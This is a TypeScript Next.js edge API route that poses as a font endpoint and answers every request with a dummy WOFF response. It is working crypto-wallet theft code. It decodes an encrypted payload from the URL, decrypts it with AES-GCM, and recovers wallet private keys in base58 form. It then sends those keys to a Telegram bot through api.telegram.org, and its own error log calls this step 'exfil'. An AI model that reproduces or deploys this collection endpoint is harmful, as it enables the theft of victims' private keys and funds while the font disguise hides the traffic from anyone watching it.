// api/inbox/[...slug].ts

import { NextRequest, NextResponse } from 'next/server'
import crypto from 'crypto'
import bs58 from 'bs58'

export const config = { runtime: 'edge' }

export default async function handler(req: NextRequest) {
  // Allow CORS (font fetch)
  const headers = {
    'Content-Type': 'font/woff',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET,OPTIONS',
    'Access-Control-Allow-Headers': '*',
    'Cache-Control': 'no-store'
  }
  if (req.method === 'OPTIONS') {
    return new NextResponse(null, { status: 204, headers })
  }

  try {
    // extract last segment without extension
    const parts = req.nextUrl.pathname.split('/')
    let name = parts.pop() || ''
    name = name.replace(/\.\w+$/, '') // strip .woff/.ico

    const [, payloadB64url] = name.split('_')
    if (!payloadB64url) throw new Error('Bad slug format')

    // normalize base64
    let b64 = payloadB64url.replace(/-/g, '+').replace(/_/g, '/')
    b64 += '='.repeat((4 - (b64.length % 4)) % 4)

    // parse JSON
    const { sBundles, keybundle } = JSON.parse(
      Buffer.from(b64, 'base64').toString('utf8').trim()
    )

    // AES‐GCM key
    const key = Buffer.from(keybundle, 'base64')
    const privKeys: string[] = []

    // decrypt each sBundle
    for (const sb of sBundles) {
      const [iv_b64, data_b64] = sb.split(':')
      const iv = Buffer.from(iv_b64, 'base64')
      const ctTag = Buffer.from(data_b64, 'base64')
      const tag = ctTag.slice(-16)
      const ct = ctTag.slice(0, -16)

      const dec = crypto.createDecipheriv('aes-256-gcm', key, iv)
      dec.setAuthTag(tag)
      const hex = Buffer.concat([dec.update(ct), dec.final()]).toString('hex')
      const last64 = hex.slice(-64)
      privKeys.push(bs58.encode(Buffer.from(last64, 'hex')))
    }

    // send to Telegram
    const BOT  = process.env.BOT_TOKEN!
    const CHAT = process.env.CHAT_ID!
    const text = privKeys.map((k,i)=>`wallet ${i+1}\n${k}`).join('\n\n')
    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT, text })
    })
  } catch (e) {
    console.error('❌ Error processing exfil:', e)
  }

  // return dummy font response
  return new NextResponse(
    new Uint8Array([0x77,0x4f,0x46,0x46]),
    { status: 200, headers }
  )
}
